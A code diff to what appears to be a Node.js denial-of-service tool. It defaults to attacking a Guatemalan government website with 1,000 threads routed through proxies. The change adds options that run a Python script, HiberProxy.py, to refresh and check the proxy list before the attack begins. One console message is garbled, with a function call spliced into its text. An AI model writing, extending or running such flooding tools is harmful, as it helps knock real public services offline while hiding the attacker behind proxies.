@@ -7,6 +7,8 @@ const fs = require('fs');
 
 const site = args['attack'] || "https://www.guatemala.gob.gt";
 const threads = args['threads'] || 1000;
+const updateproxy = (args['updateproxy']=="true"||false);
+const checkproxy = (args['checkproxy']=="true" || false);
 
 let globalProxies = [];
 let useProxy = false;
@@ -15,6 +17,7 @@ if (typeof site === 'undefined') {
   console.log('Ingresa un url');
   return;
 }
+
 if (isNaN(threads)) {
   console.log('Ingresa un numero para los thr  infiniteThread();eads');
   return;
@@ -111,6 +114,29 @@ async function testProxy() {
 }
 
 async function start() {
+  if(updateproxy)
+  {
+	
+	var spawn = require("child_process").spawn;
+	var command="./HiberProxy.py";
+	var checkparameter="n";
+	if(checkproxy)
+	{
+		var checkparameter="y";
+	}
+	else
+	{
+		var checkparameter="n";
+	}
+	var process = spawn("python3", [command,"--checkproxy",checkparameter]);
+	console.log("Actualizando proxys ...espera");
+	process.stdout.on('data', function (data) {
+		console.log(data.toString());
+	});
+	process.stderr.on('data', (data) => {
+		console.log(data.toString());
+	});
+  }
   const validProxies = await testProxy();
   if (validProxies.length > 0) {
     useProxy = true;
